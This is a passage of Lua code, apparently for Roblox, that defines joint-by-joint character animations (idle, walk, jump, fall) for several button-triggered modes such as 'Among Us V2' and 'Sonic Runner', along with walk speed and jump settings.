RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,-0.35 * sin((sine-2)*4))*angles(0.6108652381980153*sin((sine+6)*4),1.5707963267948966-0.4363323129985824*sin(sine*4),0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793+0.17453292519943295*sin(sine*4)),deltaTime)  
RightHip.C0=RightHip.C0:Lerp(cf(1,-1+0.35*sin((sine + 6)*4),0.35 * sin(sine*4))*angles(-0.7853981633974483*sin(sine*4),1.3962634015954636,0),deltaTime) 
 		end,
		jump = function()
			local fw, rt = velbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0, 0) * angles(-1.4835298641951802 + fw * 0.1, rt * -0.05, -3.141592653589793), deltaTime)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.6580627893946132 + 0.06981317007977318 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.3962634015954636, 0, -3.141592653589793 - rt), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.6580627893946132 - 0.06981317007977318 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			--Torso,0,0,0,4,-85,0,0,4,0,0,0,4,0,0,0,4,0,0,0,4,-180,0,0,4,RightArm,1,0,0,4,230,-5,0.5,4,0.5,0,0,4,100,5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,-5,0.5,4,-1,0,0,4,-95,4,0.25,4,0,0,0,4,90,0,0,4,LeftArm,-1,0,0,4,230,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-80,0,0.5,4,1,0,0,4,0,0,0.25,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,-5,0.5,4,-1,0,0,4,95,-4,0.25,4,0,0,0,4,-90,0,0,4
		end,
		fall = function()
			local fw, rt = velbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0, 0) * angles(-1.6580627893946132 + fw * 0.1, rt * -0.05, -3.141592653589793), deltaTime)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.6580627893946132 + 0.06981317007977318 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.7453292519943295, 0, -3.141592653589793 - rt), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.6580627893946132 - 0.06981317007977318 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			--Torso,0,0,0,4,-95,0,0,4,0,0,0,4,0,0,0,4,0,0,0,4,-180,0,0,4,RightArm,1,0,0,4,230,-5,0.5,4,0.5,0,0,4,100,5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,-5,0.5,4,-1,0,0,4,-95,4,0.25,4,0,0,0,4,90,0,0,4,LeftArm,-1,0,0,4,230,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-100,0,0.5,4,1,0,0,4,0,0,0.25,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,-5,0.5,4,-1,0,0,4,95,-4,0.25,4,0,0,0,4,-90,0,0,4
		end
	})

	addmode("q", {
		idle = function()
RootJoint.C0=RootJoint.C0:Lerp(cf(0,-0.6,0)*angles(-1.0471975511965976+0.17453292519943295*sin(sine*10),0,3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(1.0471975511965976+0.17453292519943295*sin((sine+10)*18),-1.5707963267948966,0),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(0.3490658503988659-0.17453292519943295*sin((sine+10)*18),1.5707963267948966,0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-2.0943951023931953-0.17453292519943295*sin(sine*10),0,3.141592653589793),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(0.3490658503988659+0.17453292519943295*sin((sine+10)*18),-1.5707963267948966,0),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(1.0471975511965976-0.17453292519943295*sin((sine+10)*18),1.5707963267948966,0),deltaTime) 
		end,
		walk = function()
			local fw, rt = velbycfrvec()

			local rY, lY = raycastlegs()

                t.setWalkSpeed(5)
RootJoint.C0=RootJoint.C0:Lerp(cf(0,-0.6,0)*angles(-1.0471975511965976+0.17453292519943295*sin(sine*10),0,3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(1.0471975511965976+0.17453292519943295*sin((sine+10)*18),-1.5707963267948966,0),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(0.3490658503988659-0.17453292519943295*sin((sine+10)*18),1.5707963267948966,0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-2.0943951023931953-0.17453292519943295*sin(sine*10),0,3.141592653589793),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(0.3490658503988659+0.17453292519943295*sin((sine+10)*18),-1.5707963267948966,0),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(1.0471975511965976-0.17453292519943295*sin((sine+10)*18),1.5707963267948966,0),deltaTime) 
 		end,
	})
	addmode("e", {
		idle = function()
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(3.141592653589793,1.3962634015954636,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0,0)*angles(1.5707963267948966,0,3.141592653589793+34906585.039886594*sin(sine*3.e-07)),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(-0.7853981633974483,-1.0471975511965976,0),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(-3.141592653589793,-1.3962634015954636,0),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(0.7853981633974483,1.0471975511965976,0),deltaTime) 
		end
	})
	addmode("r", {
		idle = function()
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0,0)*angles(-1.5707963267948966,0.3490658503988659*sin(sine*5.5),3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(-1.7453292519943295*sin((sine+5)*7),-1.2217304763960306,-1.7453292519943295*sin((sine+5)*7)),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(-1.7453292519943295*sin(sine*7),1.2217304763960306,1.7453292519943295*sin(sine*7)),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.3161255787892263),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(-0.3490658503988659,1.3962634015954636,0.3490658503988659),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(0.3490658503988659,-1.3962634015954636,0.3490658503988659),deltaTime) 		end
	})         
	addmode("t", {
		idle = function()
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1.5,0.5,-0.5)*angles(-3.141592653589793,-3.141592653589793,1.5707963267948966),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1.5,0.5,-0.5)*angles(3.141592653589793,3.141592653589793,-1.5707963267948966),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(0,1.5707963267948966,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(1 * sin(sine*-5),0,1 * sin((sine+1)*5))*angles(-1.5707963267948966,0,3.141592653589793+17453292.519943297*sin(sine*-6.e-07)),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(0,-1.5707963267948966,0),deltaTime) 
		end
	})
	addmode("y", {
		idle = function()
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(0,-1.3962634015954636,-0.17453292519943295),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0,0)*angles(-1.5707963267948966,0.7853981633974483*sin(sine*7),3.141592653589793),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1.5,0.5,-0.5)*angles(0,0,1.5707963267948966-0.7853981633974483*sin(sine*8)),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1.5,0.5,-0.5)*angles(0,0,-1.5707963267948966-0.7853981633974483*sin(sine*8)),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(0.3490658503988659,1.3962634015954636,-0.17453292519943295),deltaTime) 		end
	})        
	addmode("u", {
		idle = function()
RightHip.C0=RightHip.C0:Lerp(cf(1,-1-0.2*sin(sine*10),-0.2 * sin(sine*10))*angles(1.5707963267948966*sin(sine*10),1.5707963267948966,0),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-0.6,0.5,0)*angles(0,-3.141592653589793,-1.5707963267948966),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(0.5,0.3,0)*angles(0,2.9670597283903604,1.5707963267948966),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0.2 * sin(sine*10),0)*angles(-1.2217304763960306,0,3.141592653589793),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1-0.2*sin(sine*10),-0.2 * sin(sine*10))*angles(-1.5707963267948966*sin(sine*10),-1.5707963267948966,0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
		end
	})
	addmode("i", {
		idle = function()
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(0,-1.5707963267948966,0),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(-3.141592653589793,1.5707963267948966,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(5 * sin(sine*3),-2.5,0)*angles(-3.141592653589793,0,3.141592653589793+3.839724354387525*sin(sine*3)),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(-3.141592653589793,-1.5707963267948966,0),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(0,1.5707963267948966,0),deltaTime) 
		end,
	})
	addmode("o", {
		idle = function()
			local rY, lY = raycastlegs()
RootJoint.C0=RootJoint.C0:Lerp(cf(1 * sin(sine*2),0.5 * sin(sine*10),0)*angles(-1.5707963267948966,0,3.141592653589793+285.623132088872*sin(sine*0.05)),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(-0.3490658503988659,1.3962634015954636,0.3490658503988659),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(-0.4363323129985824,-1.2217304763960306,-0.3490658503988659),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(-3.141592653589793,-1.5707963267948966,0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(-3.141592653589793,1.5707963267948966,0),deltaTime) 
		end
	})
	addmode("p", {
		idle = function()
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(-0.3490658503988659-1.0471975511965976*sin(sine*9),-1.5707963267948966,0),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(-0.5235987755982988,-1.2217304763960306,-0.5235987755982988),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(-0.3490658503988659+1.0471975511965976*sin(sine*9),1.5707963267948966,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(3 * sin(sine*3),0,0)*angles(-1.5707963267948966,0,3.141592653589793+0.5235987755982988*sin(sine*3)),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(3.3161255787892263,1.0471975511965976,0),deltaTime) 
		end
        	})
	addmode("f", {
		idle = function()
			local rY, lY = raycastlegs()
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-0.5,0.75,0.75)*angles(1.5707963267948966,-2.443460952792061,-1.5707963267948966),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0.15 * sin((sine-0.6)*1.5),0.1 * sin((sine+0.7)*1.5))*angles(-1.2217304763960306+0.05235987755982989*sin((sine-0.7)*-1.5),-0.3490658503988659,2.792526803190927),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1+0.025*sin(sine*-1.5),-1+0.1*sin((sine - 0.4)*-1.5),0.075 * sin((sine+0.7)*-1.5))*angles(1.5707963267948966+0.05235987755982989*sin((sine+1.4)*-1.5),-1.9198621771937625,2.0943951023931953),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(0.75,0,-0.25)*angles(-0.3490658503988659,2.792526803190927,1.9198621771937625),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.9198621771937625+0.05235987755982989*sin(sine*1.5),0.17453292519943295,3.3161255787892263),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-0.5,-1)*angles(1.5707963267948966,1.3962634015954636,-1.9198621771937625),deltaTime) 
		end
	})
end)
btn("Among Us V2", function()
	local t=reanimate()
	if type(t)~="table" then return end
	local addmode=t.addmode
	local getJoint=t.getJoint
	local velbycfrvec=t.velbycfrvec
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")
	t.setWalkSpeed(16)
	t.setJumpPower(0)
	addmode("default",{
		idle=function()

LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1-0.3*sin(sine*10),0)*angles(0,-1.2217304763960306+0.2617993877991494*sin((sine-30)*10),0.17453292519943295*sin((sine+60)*10)),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1-0.3*sin(sine*10),0)*angles(0,1.2217304763960306+0.2617993877991494*sin((sine+30)*10),-0.17453292519943295*sin((sine+60)*10)),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(0,0.5,1)*angles(0,1.5707963267948966,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0.3 * sin((sine-0.15)*10),0)*angles(-1.5707963267948966,0,3.141592653589793+0.08726646259971647*sin((sine+0.5)*5)),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(0,0.5,1)*angles(0,-1.5707963267948966,0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
		end,
		walk=function()
			local fw,rt=velbycfrvec()
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1+0.5*sin((sine + 0.5)*8.5),-0.25+0.5*sin(sine*8.5))*angles(1.0471975511965976*sin((sine+0.3)*8.5),-1.5707963267948966,0),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-0.5,0.5,0.5)*angles(0,0,0),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1+0.5*sin((sine + 0.5)*-8.5),-0.25+0.5*sin((sine + 0.025)*-8.5))*angles(1.0471975511965976*sin((sine+0.3)*-8.5),1.5707963267948966,0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(0.5,0.5,0.5)*angles(0,0,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0.1 * sin(sine*8.5),0.06 * sin((sine+0.5)*8.5))*angles(-1.9198621771937625+0.04363323129985824*sin((sine-0.5)*-8.5),0,3.141592653589793),deltaTime) 
		end,
        		jump = function()
			local fw, rt = velbycfrvec()

RightShoulder.C0=RightShoulder.C0:Lerp(cf(0.5,0.5,0.5)*angles(0,0,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0,0)*angles(-1.0471975511965976,0,3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-0.5,0.5,0.5)*angles(0,0,0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,-0.5,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(0.17453292519943295-0.17453292519943295*sin(sine*20),-1.5707963267948966,0),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(0.17453292519943295+0.17453292519943295*sin(sine*20),1.5707963267948966,0),deltaTime) 
		end,
		fall = function()
			local fw, rt = velbycfrvec()
RightShoulder.C0=RightShoulder.C0:Lerp(cf(0.5,0.5,0.5)*angles(0,0,0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,-0.5,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-0.5,0.5,0.5)*angles(0,0,0),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1,0)*angles(0.17453292519943295*sin(sine*20),-1.5707963267948966,0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0,0)*angles(-2.0943951023931953,0,3.141592653589793),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1,0)*angles(-0.17453292519943295*sin(sine*20),1.5707963267948966,0),deltaTime) 
		end
	})
end)
btn("Sonic Runner", function()
	local t=reanimate()
	if type(t)~="table" then return end
	local addmode=t.addmode
	local getJoint=t.getJoint
	local velbycfrvec=t.velbycfrvec
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")
	t.setWalkSpeed(60)

	addmode("default",{
		idle=function()
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.4-0.1*sin(sine*2),0)*angles(-0.5235987755982988-0.17453292519943295*sin(sine*2),1.2217304763960306-0.17453292519943295*sin((sine+7)*2),0.5235987755982988+0.17453292519943295*sin(sine*2)),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1-0.1*sin((sine + 10)*2),0)*angles(-0.08726646259971647,-1.2217304763960306,0),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1-0.1*sin((sine + 10)*2),0)*angles(-0.05235987755982989,1.3962634015954636,0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.3161255787892263),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0.1 * sin((sine+10)*2),0)*angles(-1.5707963267948966,0,3.6651914291880923),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.4+0.1*sin(sine*2),0)*angles(-0.5235987755982988+0.17453292519943295*sin(sine*2),-1.2217304763960306+0.17453292519943295*sin((sine+10)*2),-0.5235987755982988+0.17453292519943295*sin(sine*2)),deltaTime) 
		end,
		walk=function()
			local fw,rt=velbycfrvec()
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-1-0.2*sin(sine*30),0)*angles(-2.0943951023931953*sin((sine+10)*23),-1.5707963267948966+0.17453292519943295*sin(sine*25),0),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0,0.2 * sin(sine*30),0)*angles(-1.9198621771937625,0,3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-1,0.5,0)*angles(-1.0471975511965976-0.17453292519943295*sin((sine+10)*28),-1.5707963267948966,0),deltaTime) 
RightHip.C0=RightHip.C0:Lerp(cf(1,-1-0.2*sin(sine*30),0)*angles(2.0943951023931953*sin((sine+10)*23),1.5707963267948966+0.17453292519943295*sin(sine*25),0),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(1,0.5,0)*angles(-1.0471975511965976+0.17453292519943295*sin((sine+9)*28),1.5707963267948966,0),deltaTime) 
		end,
		jump = function()
			local fw, rt = velbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0, 0) * angles(-1.4835298641951802 + fw * 0.1, rt * -0.05, -3.141592653589793), deltaTime)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.6580627893946132 + 0.06981317007977318 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.3962634015954636, 0, -3.141592653589793 - rt), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.6580627893946132 - 0.06981317007977318 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			--Torso,0,0,0,4,-85,0,0,4,0,0,0,4,0,0,0,4,0,0,0,4,-180,0,0,4,RightArm,1,0,0,4,230,-5,0.5,4,0.5,0,0,4,100,5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,-5,0.5,4,-1,0,0,4,-95,4,0.25,4,0,0,0,4,90,0,0,4,LeftArm,-1,0,0,4,230,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-80,0,0.5,4,1,0,0,4,0,0,0.25,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,-5,0.5,4,-1,0,0,4,95,-4,0.25,4,0,0,0,4,-90,0,0,4
		end,
		fall = function()
			local fw, rt = velbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(0, 0, 0) * angles(-1.6580627893946132 + fw * 0.1, rt * -0.05, -3.141592653589793), deltaTime)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.6580627893946132 + 0.06981317007977318 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.7453292519943295, 0, -3.141592653589793 - rt), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.6580627893946132 - 0.06981317007977318 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			--Torso,0,0,0,4,-95,0,0,4,0,0,0,4,0,0,0,4,0,0,0,4,-180,0,0,4,RightArm,1,0,0,4,230,-5,0.5,4,0.5,0,0,4,100,5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,-5,0.5,4,-1,0,0,4,-95,4,0.25,4,0,0,0,4,90,0,0,4,LeftArm,-1,0,0,4,230,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-100,0,0.5,4,1,0,0,4,0,0,0.25,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,-5,0.5,4,-1,0,0,4,95,-4,0.25,4,0,0,0,4,-90,0,0,4
		end
	})
end)
btn("Funni Bunni", function()
	local t=reanimate()
	if type(t)~="table" then return end
	local addmode=t.addmode
	local getJoint=t.getJoint
	local velbycfrvec=t.velbycfrvec
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")
	t.setWalkSpeed(16)
    t.setJumpPower(0)

	addmode("default",{
		idle=function()

RightHip.C0=RightHip.C0:Lerp(cf(1,-0.5+0.175*sin(sine*-4),-0.75)*angles(0,1.5707963267948966,-0.17453292519943295),deltaTime) 
RootJoint.C0=RootJoint.C0:Lerp(cf(0.2 * sin(sine*2),-0.5+0.175*sin(sine*4),0)*angles(-1.5707963267948966,0.08726646259971647*sin(sine*2),3.141592653589793),deltaTime) 
LeftHip.C0=LeftHip.C0:Lerp(cf(-1,-0.5+0.175*sin(sine*-4),-0.75)*angles(0,-1.5707963267948966,0.17453292519943295),deltaTime) 
RightShoulder.C0=RightShoulder.C0:Lerp(cf(0.6,-0.175,-0.5)*angles(1.5707963267948966,2.0943951023931953,1.2217304763960306),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-0.6,-0.175,-0.5)*angles(1.5707963267948966,-2.0943951023931953,-1.2217304763960306),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0.1 * sin((sine-0.5)*2),1.1+0.1*sin((sine - 0.5)*4),0)*angles(-1.5707963267948966,0.1308996938995747*sin((sine-0.6)*2),3.141592653589793),deltaTime) 
		end,
		walk=function()
			local fw,rt=velbycfrvec()
RootJoint.C0=RootJoint.C0:Lerp(cf(0,-0.25+0.2*sin(sine*8.5),0.1 * sin((sine-0.5)*8.5))*angles(-1.5707963267948966+0.08726646259971647*sin((sine+0.5)*8.5),0,3.141592653589793+0.08726646259971647*sin(sine*-4.25)),deltaTime) 
Neck.C0=Neck.C0:Lerp(cf(0,1,0)*angles(-1.5707963267948966,0,3.141592653589793),deltaTime) 
LeftShoulder.C0=LeftShoulder.C0:Lerp(cf(-0.5,-0.2+0.125*sin((sine + 1.25)*-8.5),-0.75)*angles(-1.5707963267948966,-1.0471975511965976,1.7453292519943295+0.08726646259971647*sin((sine+0.25)*8.5)),deltaTime) 
